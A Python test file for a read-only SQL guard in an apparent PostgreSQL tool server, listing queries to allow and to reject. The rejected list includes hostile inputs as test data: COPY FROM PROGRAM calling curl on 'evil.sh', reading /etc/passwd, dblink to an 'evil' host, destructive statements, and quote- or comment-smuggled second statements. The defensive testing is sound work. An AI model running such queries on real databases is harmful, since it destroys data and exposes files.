"""Guard tests. Run with: python -m pytest tests -q  (or: python tests/test_guard.py)"""

from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from pg_mcp.guard import UnsafeQueryError, check_query, sanitize  # noqa: E402

ALLOWED = [
    "SELECT 1",
    "select * from customers limit 10",
    "SELECT * FROM orders WHERE ref = 'ORD123' ORDER BY ts DESC LIMIT 5;",
    "WITH recent AS (SELECT * FROM orders WHERE ts > now() - interval '7 days') "
    "SELECT count(*) FROM recent",
    "TABLE customers",
    "VALUES (1), (2)",
    "SHOW server_version",
    # Words that look dangerous but are data or identifiers.
    "SELECT * FROM events WHERE action = 'delete'",
    "SELECT * FROM events WHERE note = 'drop table users; --'",
    'SELECT "update" FROM "delete_log"',
    "SELECT updated_at, created_at, deleted_at FROM t",
    "SELECT * FROM t OFFSET 10 FETCH FIRST 5 ROWS ONLY",
    "SELECT $$ drop table x $$ AS literal",
    "SELECT 1 -- insert into t values (1)",
    "SELECT 1 /* update t set a=1 */",
    "SELECT 1 /* nested /* update */ still comment */",
    "SELECT e'it\\'s fine' AS s",
    "SELECT count(*) FROM pg_stat_activity",
]

REJECTED = [
    ("INSERT INTO t VALUES (1)", "insert"),
    ("UPDATE t SET a = 1", "update"),
    ("DELETE FROM t", "delete"),
    ("MERGE INTO t USING s ON true WHEN MATCHED THEN DO NOTHING", "merge"),
    ("DROP TABLE t", "drop"),
    ("TRUNCATE t", "truncate"),
    ("CREATE TABLE t (a int)", "create"),
    ("ALTER TABLE t ADD COLUMN b int", "alter"),
    ("GRANT ALL ON t TO public", "grant"),
    ("SELECT 1; DROP TABLE t", "multi-statement"),
    ("SELECT 1; SELECT 2", "multi-statement"),
    ("SELECT * FROM t FOR UPDATE", "row lock"),
    ("SELECT * FROM t FOR NO KEY UPDATE", "row lock"),
    ("SELECT * FROM t FOR SHARE", "row lock"),
    ("SELECT * INTO new_table FROM t", "SELECT INTO"),
    ("WITH x AS (INSERT INTO t VALUES (1) RETURNING *) SELECT * FROM x", "writable CTE"),
    ("WITH x AS (DELETE FROM t RETURNING *) SELECT * FROM x", "writable CTE"),
    ("COPY t TO '/tmp/x.csv'", "copy"),
    ("COPY t FROM PROGRAM 'curl evil.sh'", "copy"),
    ("SET search_path = evil", "set"),
    ("SET SESSION default_transaction_read_only = off", "set"),
    ("RESET ALL", "reset"),
    ("BEGIN", "tx control"),
    ("COMMIT", "tx control"),
    ("DO $$ BEGIN PERFORM 1; END $$", "do block"),
    ("CALL my_proc()", "call"),
    ("PREPARE p AS SELECT 1", "prepare"),
    ("EXECUTE p", "execute"),
    ("VACUUM FULL", "vacuum"),
    ("REFRESH MATERIALIZED VIEW mv", "refresh"),
    ("LOCK TABLE t", "lock"),
    ("COMMENT ON TABLE t IS 'x'", "comment on"),
    ("SELECT pg_read_file('/etc/passwd')", "file read"),
    ("SELECT pg_sleep(60)", "sleep"),
    ("SELECT pg_terminate_backend(123)", "terminate"),
    ("SELECT set_config('x', 'y', false)", "set_config"),
    ("SELECT dblink('host=evil', 'select 1')", "dblink"),
    ("SELECT lo_export(1, '/tmp/x')", "lo_export"),
    ("SELECT pg_advisory_lock(1)", "advisory lock"),
    ("", "empty"),
    ("   ", "empty"),
    ("SELECT 1\x00", "null byte"),
    # Smuggling attempts: the payload must not hide behind a literal.
    ("SELECT 'a\\' ; DROP TABLE t -- '", "backslash is not an escape"),
    ("SELECT $tag$ x $tag$ ; DROP TABLE t", "after dollar quote"),
    ("SELECT 1 /* comment */ ; DELETE FROM t", "after comment"),
]


def run() -> int:
    failures: list[str] = []

    for sql in ALLOWED:
        try:
            check_query(sql)
        except UnsafeQueryError as exc:
            failures.append(f"FALSE POSITIVE: {sql!r} -> {exc}")

    for sql, label in REJECTED:
        try:
            check_query(sql)
        except UnsafeQueryError:
            continue
        failures.append(f"FALSE NEGATIVE ({label}): {sql!r} was ALLOWED")

    # sanitize() must preserve length so offsets stay meaningful.
    for sql in ALLOWED:
        if len(sanitize(sql)) != len(sql):
            failures.append(f"LENGTH DRIFT in sanitize: {sql!r}")

    total = len(ALLOWED) + len(REJECTED) + len(ALLOWED)
    if failures:
        print(f"{len(failures)} / {total} checks FAILED:\n")
        for line in failures:
            print("  " + line)
        return 1
    print(f"All {total} guard checks passed "
          f"({len(ALLOWED)} allowed, {len(REJECTED)} rejected, {len(ALLOWED)} length).")
    return 0


# pytest entry points
def test_allowed() -> None:
    for sql in ALLOWED:
        check_query(sql)


def test_rejected() -> None:
    for sql, label in REJECTED:
        try:
            check_query(sql)
        except UnsafeQueryError:
            continue
        raise AssertionError(f"{label}: {sql!r} was allowed")


if __name__ == "__main__":
    raise SystemExit(run())
